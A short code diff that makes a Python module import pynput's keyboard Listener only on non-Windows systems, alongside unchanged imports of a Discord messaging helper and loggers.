@@ -1,4 +1,8 @@
-from pynput.keyboard import Listener
+import platform
+
+if platform.system() != "Windows":
+    from pynput.keyboard import Listener
+
 from .discord_file import send_message
 from .utility import action_checker
 from .logger import errorLogger, infoLogger
